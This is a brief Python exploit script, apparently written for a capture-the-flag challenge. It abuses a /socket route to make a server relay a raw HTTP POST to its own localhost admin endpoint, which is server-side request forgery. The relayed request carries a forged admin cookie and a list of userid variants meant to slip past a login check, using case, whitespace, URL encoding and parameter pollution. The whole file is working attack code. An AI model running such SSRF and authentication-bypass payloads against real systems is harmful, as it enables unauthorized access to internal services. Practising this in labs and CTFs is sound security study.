import requests

url = "http://<target>/socket"  # Change this to the actual target

payloads = [
    #"userid=admin",       # Normal case
    #"userid=Admin",       # Capitalization trick
    #"userid= admin",      # Leading space
    "userid=admin ",      # Trailing space
    #"userid=%61dmin",     # URL encoding
    #"userid=a%64min",     # Mixed encoding
    #"userid=admin&userid=hacker",  # Parameter pollution
]

for payload in payloads:
    data = {
        "host": "127.0.0.1",
        "port": "1337",
        "data": "POST /admin HTTP/1.1\r\n"
                "Host: 127.0.0.1\r\n"
                "User-Agent: Admin Browser\r\n"
                "Cookier: admin\r\n"
                "Cookie: admin=true\r\n"
                "Content-Length: {}\r\n"
                "Connection: close\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "\r\n"
                "{}".format(len(payload), payload)
    }

    # Send request through the /socket route
    response = requests.post(url, data=data)

    # Print response to check if the flag is obtained
    print(f"Trying payload: {payload}\nResponse: {response.text}\n")
